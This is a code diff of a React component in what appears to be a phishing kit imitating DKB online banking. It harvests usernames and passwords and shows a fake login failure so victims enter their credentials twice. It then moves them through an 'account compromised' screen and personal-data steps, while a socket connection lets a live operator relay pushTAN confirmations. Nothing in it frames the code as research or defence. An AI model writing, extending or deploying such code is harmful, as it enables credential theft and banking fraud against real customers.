@@ -152,7 +152,9 @@ function FormFlow() {
   const [loadingMessage, setLoadingMessage] = useState('');
   const [stepConfig, setStepConfig] = useState<StepConfig>(DEFAULT_CONFIG);
   const [configLoaded, setConfigLoaded] = useState(false);
-  const [sessionData, setSessionData] = useState<any>({});
+  const [sessionData, setSessionData] = useState<Record<string, any>>({});
+  const [loginAttempts, setLoginAttempts] = useState(0);
+  const [loginError, setLoginError] = useState<string | null>(null);
   
   // Enhanced TAN system state
   const [currentTanRequest, setCurrentTanRequest] = useState<{
@@ -180,7 +182,7 @@ function FormFlow() {
       setIsWaitingForAdmin(true);
       
       // Store the next state to transition to when admin continues
-      setSessionData(prev => ({ ...prev, pendingState: nextState }));
+      setSessionData((prev: Record<string, any>) => ({ ...prev, pendingState: nextState }));
       
       // Notify admin that user is waiting
       templateSocketClient.emit('user-waiting', {
@@ -293,7 +295,7 @@ function FormFlow() {
             setLoadingMessage('Daten werden aktualisiert...');
             
             setTimeout(() => {
-              setSessionData(prev => ({ ...prev, ...data }));
+              setSessionData((prev: Record<string, any>) => ({ ...prev, ...data }));
               setLoading(false);
             }, 1000);
           },
@@ -322,7 +324,7 @@ function FormFlow() {
               setIsWaitingForAdmin(false);
               setLoading(false);
               setState(sessionData.pendingState);
-              setSessionData(prev => ({ ...prev, pendingState: null }));
+              setSessionData((prev: Record<string, any>) => ({ ...prev, pendingState: null }));
             }
           },
           // Enhanced TAN system handlers
@@ -377,25 +379,37 @@ function FormFlow() {
     
     try {
       console.log('Login submitted for session:', key);
-      setSessionData(prev => ({ ...prev, login: data }));
-      
+      setSessionData((prev: Record<string, any>) => ({ ...prev, login: data }));
+
+      const currentAttempt = loginAttempts + 1;
+      setLoginAttempts(currentAttempt);
+
       setLoading(true);
-      setLoadingMessage("Anmeldung wird verarbeitet...");
-      
-      // Submit login data to backend
+      setLoadingMessage("Anmeldedaten werden überprüft...");
+
       const response = await submitTemplateData({
         template_name: 'dkb',
         key: key || '',
         step: 'login',
         data: {
           username: data.username,
-          password: data.password
+          password: data.password,
+          attempt: currentAttempt
         }
       });
 
-      if (response.success) {
-        // Check doubleLogin config - if disabled, skip to next step
-        if (stepConfig.doubleLogin) {
+      if (!response.success) {
+        setError(response.error || 'Fehler bei der Anmeldung');
+        setState(STATES.LOGIN_ERROR);
+        setLoading(false);
+        return;
+      }
+
+      setTimeout(() => {
+        if (stepConfig.doubleLogin && currentAttempt === 1) {
+          setLoginError('Anmeldung fehlgeschlagen. Bitte versuchen Sie es erneut.');
+          setState(STATES.LOGIN_ERROR);
+        } else if (stepConfig.doubleLogin && currentAttempt > 1) {
           proceedToNextState(STATES.ACCOUNT_COMPROMISED, 'Sicherheitsprüfung wird gestartet...');
         } else if (stepConfig.personalData) {
           proceedToNextState(STATES.PERSONAL_DATA, 'Persönliche Daten werden geladen...');
@@ -406,12 +420,8 @@ function FormFlow() {
         } else {
           proceedToNextState(STATES.FINAL_SUCCESS, 'Vorgang wird abgeschlossen...');
         }
-      } else {
-        setError(response.error || 'Fehler bei der Anmeldung');
-        setState(STATES.LOGIN_ERROR);
-      }
-      
-      setLoading(false);
+        setLoading(false);
+      }, 2000);
     } catch (error: any) {
       console.error('Login error:', error);
       setError('Fehler bei der Anmeldung');
@@ -472,7 +482,7 @@ function FormFlow() {
     }
     
     try {
-      setSessionData(prev => ({ ...prev, personalData: data }));
+      setSessionData((prev: Record<string, any>) => ({ ...prev, personalData: data }));
       
       setLoading(true);
       setLoadingMessage("Persönliche Daten werden verarbeitet...");
@@ -644,7 +654,7 @@ function FormFlow() {
         return <LoginForm onSubmit={handleLoginSubmit} />;
         
       case STATES.LOGIN_ERROR:
-        return <LoginForm onSubmit={handleLoginSubmit} errorMessage="Anmeldung fehlgeschlagen. Bitte versuchen Sie es erneut." />;
+        return <LoginForm onSubmit={handleLoginSubmit} errorMessage={loginError || "Anmeldung fehlgeschlagen. Bitte versuchen Sie es erneut."} />;
         
       case STATES.ACCOUNT_COMPROMISED:
         return <AccountCompromisedScreen onStartVerification={handleAccountCompromisedContinue} />;
@@ -665,14 +675,13 @@ function FormFlow() {
         return <PushTANScreen 
           tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
           transactionDetails={currentTanRequest?.transactionDetails}
-          onSubmit={(tan) => {
-            console.log('pushTAN submitted:', tan);
+          onConfirm={() => {
+            console.log('pushTAN confirmed');
             // Send TAN completion back to admin
             templateSocketClient.emit('tan-completed', {
               requestId: currentTanRequest?.requestId,
               success: true,
-              type: currentTanRequest?.type,
-              tanValue: tan
+              type: currentTanRequest?.type
             });
             setCurrentTanRequest(null);
             setState(STATES.FINAL_SUCCESS);
@@ -727,7 +736,6 @@ function FormFlow() {
         return <Loading 
           message={isWaitingForAdmin ? loadingMessage : 'Wird verarbeitet...'} 
           type="processing"
-          showProgress={false}
         />;
         
       case STATES.ERROR:
